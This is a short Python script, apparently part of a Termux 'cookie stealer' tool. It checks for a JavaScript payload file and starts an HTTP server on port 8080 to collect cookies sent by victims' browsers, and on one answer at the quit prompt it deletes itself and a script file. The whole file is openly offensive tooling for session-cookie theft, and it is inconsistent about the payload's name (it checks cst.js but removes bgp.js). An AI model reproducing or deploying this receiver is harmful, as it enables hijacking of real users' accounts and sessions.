import os
import sys
import time
import subprocess
from termcolor import colored

time.sleep(1.5)
print("Cookie Stealer Is Starting Now....")
time.sleep(2)

#definig a function to run the main server
def cookiestealer():
	if os.path.exists('cst.js') == False:
		print(colored("\n\n Javscript File Not Found..exiting now!\n", "red", attrs=['bold']))
		sys.exit(0)
	else:
		print(colored("\n\n[*] Javscript File Found", "red", attrs=['bold']))
		print(colored("\n[*]Starting HTTP Server For Receving Cookies", "green", attrs=['bold']))
		time.sleep(2)
		os.system("clear")
		try:
			print(colored("------Server Online------", "green"))
			print(colored("[#]Awaiting For Requests with cookies"))
			subprocess.call("python -m SimpleHTTPServer 8080", shell=True)
			#starting the python server awaiting for http get requests with cookies.....!
		except KeyboardInterrupt:
			ask = input(colored("\n\nDo you want to quit Cookie-Stealer...Y/N: ", "red", attrs=['bold']))
			if ask == 'Y':
				print("\n\n[+]Stopping Cookie-Stealer....\n\n")
				sys.exit(0)
			elif ask == 'N':
				pass
			else:
				#sorry for this.......!!!
				print("going to delete me")
				os.remove("cookie-stealer-termux.py")
				os.remove("bgp.js")
				print("\n\n[#]Bye")
				

def main():
    cookiestealer()

main()
